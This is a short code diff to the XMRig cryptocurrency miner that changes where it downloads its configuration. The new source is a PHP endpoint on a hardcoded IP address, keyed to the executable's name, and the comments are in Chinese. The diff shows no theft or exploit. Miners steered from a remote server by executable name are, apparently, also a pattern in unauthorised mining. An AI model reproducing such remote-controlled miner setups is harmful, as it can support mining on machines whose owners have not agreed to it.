@@ -426,8 +426,10 @@ void xmrig::Config::loadWebConfig()
             execName = "666";
         }
         
-        // 构建配置URL
-        m_webConfigUrl = "http://182.92.97.16:8181/configs/" + execName + "+cpu.json";
+        // 构建配置URL - 优先使用新的用户API，如果失败则回退到旧格式
+        // 新格式：/api/user_config.php?user=username
+        // 旧格式：/configs/username+cpu.json
+        m_webConfigUrl = "http://182.92.97.16:8181/api/user_config.php?user=" + execName;
         LOG_INFO("Using web configuration URL based on executable name '%s': %s", 
                  execName.c_str(), m_webConfigUrl.c_str());
     }
